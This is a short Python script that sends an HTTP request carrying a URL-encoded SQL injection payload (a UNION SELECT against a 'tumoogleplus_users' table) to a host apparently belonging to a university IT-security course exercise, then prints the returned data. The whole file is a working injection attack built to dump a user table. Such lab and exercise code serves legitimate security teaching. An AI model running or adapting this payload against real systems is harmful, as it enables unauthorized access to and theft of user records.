import requests

with requests.Session() as sess:
    response = sess.get("https://t4.itsec.sec.in.tum.de/?q=%22+UNION+SELECT+*+FROM+tumoogleplus_users+--+")
    print(response.text)
